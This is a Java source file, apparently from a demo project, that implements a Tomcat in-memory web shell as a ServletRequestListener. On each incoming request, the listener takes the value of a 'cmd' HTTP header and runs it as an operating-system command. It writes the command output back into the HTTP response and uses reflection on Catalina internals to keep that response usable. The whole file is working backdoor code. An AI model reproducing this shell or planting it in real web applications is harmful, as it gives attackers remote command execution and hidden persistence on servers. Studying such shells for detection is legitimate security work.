package com.example.tomcatmemshell.demos.web.addListener;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;

public class MemshellListener implements ServletRequestListener {
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest();
            Field requestF = req.getClass().getDeclaredField("request");

            requestF.setAccessible(true);
            Request request = (Request)requestF.get(req);

            String cmd = req.getHeader("cmd");
            if (cmd != null){
                Process p=Runtime.getRuntime().exec(cmd);
                InputStream inputStream = p.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                PrintWriter writer = request.getResponse().getWriter();
                while ((line = reader.readLine()) != null) {
                    writer.write(line);
                }
                writer.flush();
                Field useF = request.getResponse().getClass().getDeclaredField("usingWriter");
                useF.setAccessible(true);
                useF.set(request.getResponse(),false);
                p.waitFor();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}